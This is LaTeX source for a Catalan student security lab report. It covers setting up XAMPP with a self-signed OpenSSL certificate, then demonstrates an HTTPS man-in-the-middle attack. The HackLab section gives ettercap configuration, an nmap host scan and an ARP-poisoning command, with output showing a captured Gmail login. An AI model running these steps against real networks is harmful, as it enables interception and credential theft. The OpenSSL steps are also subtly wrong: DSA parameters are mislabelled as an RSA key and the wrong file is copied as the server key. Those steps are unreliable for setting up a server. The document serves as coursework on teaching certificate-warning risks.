\documentclass[a4paper,11pt]{scrartcl}
\usepackage[utf8x]{inputenc}
\usepackage[catalan]{babel}
\usepackage{titlesec}
\usepackage{indentfirst}
\usepackage{amsmath}
\usepackage{float}
\usepackage{graphicx}
\usepackage{subfigure}
\usepackage{booktabs}
\usepackage{multirow}
\usepackage{hyperref}
\usepackage{url}
\usepackage{multirow}
\usepackage{minted} %wget http://minted.googlecode.com/hg/minted.sty

% aptitude install texlive-fonts-extra
\usepackage{newcent} %font mes wapa

\graphicspath{{diagrames/}}

% Estil de seccions
\titleformat{\section}{\large\sectfont}{\thesection}{1em}{}
\titleformat{\subsection}{\bfseries\sectfont}{\thesubsection}{1em}{}
% Estil numeracio subseccions http://help-csli.stanford.edu/tex/latex-sections.shtml#number
%\def\thesubsection{\alph{subsection})}

\title{Teoria de la Informació i la Codificació: \\ Pràctica de seguretat}
\author{ Bartomeu Miró Mateu \thanks{bartomeumiro a gmail punt com} \\
	 Lluís Cortès Rullan \thanks{lluisbinet a gmail punt com} }

\begin{document}

  \maketitle

  \begin{abstract}
    Securització de un servidor web emprant OpenSSL.
  \end{abstract}

  \newpage

\section{Introducció}



\section{Configuració XAMPP}
XAMPP és un paquet de programari que conté un servidor web, Apache; una base 
de dades, MySQL i dos llenguatges per interaccionar amb ells, Perl i PHP. El
fet de emprar el XAMPP és perqué és un paquet preparat per l'ús immediat i
requereix poca configuració.

En un entorn GNU/Linux senzillament s'ha de baixar el paquet i descomprimir-lo
com a super-usuari a \texttt{/opt}

\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
wget http://ignum.dl.sourceforge.net/project/xampp/XAMPP%20Linux/1.7.4/
xampp-linux-1.7.4.tar.gz

tar xvfz xampp-linux-1.7.4.tar.gz -C /opt
\end{minted}

Podem executar-lo amb la següent comanda i a continuació obrir un navegador
web a \href{http://localhost}{localhost} per comprovar si funciona.

\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
/opt/lampp/lampp start
\end{minted}

\section{Configuració OpenSSL}
Per la insta\lgem ació del OpenSSL pot fer-se baixant el paquet a la seva
web\footnote{\url{http://openssl.org}} o directament amb el paquet pre-compilat
de la distribució emprada. En en aquest cas la distribució emprada es Debian 
GNU/Linux, així doncs el paquet a insta\lgem ar és el \texttt{openssl}

\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
aptitude install openssl
\end{minted}

Cal esmentar que aquest paquet és sols per generar els certificats, l'Apache del XAMPP
porta suport per OpenSSL per atendre les peticions i emprar les claus generades.

Les claus mencionades és generen de la següent manera.
En primer lloc generam la clau RSA, ens declaram autàrquics i no emprarem cap entitat
oficial que la signi.

\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
openssl dsaparam -rand -genkey -out mevaRSA.key 1024
\end{minted}

Tot seguit generam la clau CA.

\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
openssl gendsa -des3 -out meuCA.key mevaRSA.key
\end{minted}

Aquest pas ens requereix una contrasenya, nosaltres establim \texttt{practicaseguretat}.

Finalment empram la clau per generar el certificat, amb una caducitat d'un any i emprant
x509.

\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
openssl req -new -x509 -days 365 -key meuCA.key -out nou.crt
\end{minted}

Un cop hem acabat posam aquests fitxers a la carpeta del XAMPP.

\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
cp mevaRSA.key /opt/lampp/etc/ssl.key
cp nou.crt /opt/lampp/etc/ssl.crt
\end{minted}

Un cop fet això ja podem obrir el navegador emprant \emph{https} a \href{https://localhost}{localhost}
i acceptar el certificat, assegurant-mos que sigui el correcte.

Ja tenim securitzat en nostre servidor amb OpenSSL, ara nomes fa falta distribuir
els certificats als usuaris perquè els posin al seu navegador i empraran connexions segures.

\section{HackLab}
En aquest apartat s'explica com saltar-se la seguretat OpenSSL prenent un parell de suposicions:

\begin{itemize}
  \item La víctima i l'atacant estan a la mateixa subxarxa.
  \item La víctima ha d'acceptar un nou certifica SSL fals del qual l'adverteix el navegador.
\end{itemize}

La primera suposició és senzilla, simplement implica que ambdós clients estiguin connectats
a la mateixa xarxa, fins i tot es factible amb xarxes sense fils o \emph{switch} sempre
i quan es faci un enverinament ARP per fer creure que l'atacant és el punt d'accés
i rebi els missatges.

A continuació ens hem d'assegurar que el \texttt{ettercap} està configurat adequadament,
concretament hem de observar que el fitxer \texttt{/etc/etter.conf} hi hagi els següents paràmetres;

\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
[privs]
ec_uid = 0
ec_gid = 0
\end{minted}

També cal des-comentar les següents línies del fitxer, quedant de la manera següent:

\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport
%port -j REDIRECT --to-port %rport"
redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport
%port -j REDIRECT --to-port %rport"
\end{minted}

Ara hem de conèixer en quin escenari ens trobam, primer de tot identificar la nostra adreça IP
i targeta de xarxa. La targeta de xarxa si es cablejada segurament serà \texttt{eth0},
així doncs amb un \texttt{ifconfig eth0} hauríem de veure la nostra adreça IP al camp
\texttt{inet addr}.

Un cop fet això cercam les víctimes, una manera de fer-ho és emprant el programa \texttt{nmap},
aquest llança \emph{pings} a totes les adreces de la nostra xarxa i mira quines responen.

\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
nmap -sP 192.168.1.0/24
\end{minted}

això ens respondrà amb un

\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
Starting Nmap 5.21 ( http://nmap.org ) at 2011-05-24 12:23 CEST
Nmap scan report for 192.168.1.40
Host is up (0.0011s latency).
Nmap scan report for 192.168.1.63
Host is up (0.00062s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 29.89 seconds
\end{minted}

En el nostre cas la víctima és \texttt{192.168.1.63}, nosaltres som l'atacant
amb la adreça \texttt{192.168.1.40}.

Ara toca fer l'enverinament ARP perquè la víctima ens envii a nosaltres els paquets
en lloc del \emph{router} i així poder-los veure i contestar. Aquesta tècnica també
és coneguda com \emph{man in the middle}.

\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
ettercap -Tq -i eth0 -M arp:remote,oneway /192.168.1.63/ //
\end{minted}

Ara senzillament toca esperar que la víctima intenti loguejar i accepti el nostre
certificat fals. En aquest instant la connexió estarà xifrada amb el nostre certificat
i per tant podem desxifrar el missatge enviat. Tot això ho fa el \texttt{ettercap} per nosaltres.

\begin{minted}[frame=lines, fontsize=\footnotesize]{text}
ettercap NG-0.7.3 copyright 2001-2004 ALoR & NaGA

Listening on eth0... (Ethernet)

  eth0 ->       00:0A:E4:33:D4:58     192.168.1.40     255.255.255.0

Privileges dropped to UID 0 GID 0...

  28 plugins
  39 protocol dissectors
  53 ports monitored
7587 mac vendor fingerprint
1698 tcp OS fingerprint
2183 known services

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
* |==================================================>| 100.00 %

1 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : 192.168.1.63 00:23:18:B1:D2:92

 GROUP 2 : ANY (all the hosts in the list)
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help

HTTP : 209.85.227.104:443 -> USER: practicaopenssl  PASS: \emph{h4x0r_pass}  
INFO: https://www.google.com/accounts/ServiceLogin?service=mail&passive=true&rm=
false&continue=https://mail.google.com/mail/?ui=html&zy=l&bsv=llya694le36z&
\end{minted}

Com podem veure la víctima ha intentat loguejar al seu correu de Gmail. L'usuari és \emph{practicaopenssl}
i la contrasenya \emph{h4x0r\_pass}. Això significa que ha rebut l'advertiment de que el certificat no
era l'autèntic de la pàgina i segurament per resignació, desconeixement i ganes d'entrar al seu
correu ha ignorat l'advertiment acceptant el nou certificat fraudulent.
Aquest procediment funciona per totes les webs amb SSL que s'han provat, entre elles el Facebook, Lastfm...

En resum, emprar \emph{https} no és garantia de res sinó es sap amb seguretat que el certificat emprat
es el correcte.

%http://www.youtube.com/watch?v=ESGV9zlo0Zo


\input{peu}

\end{document}
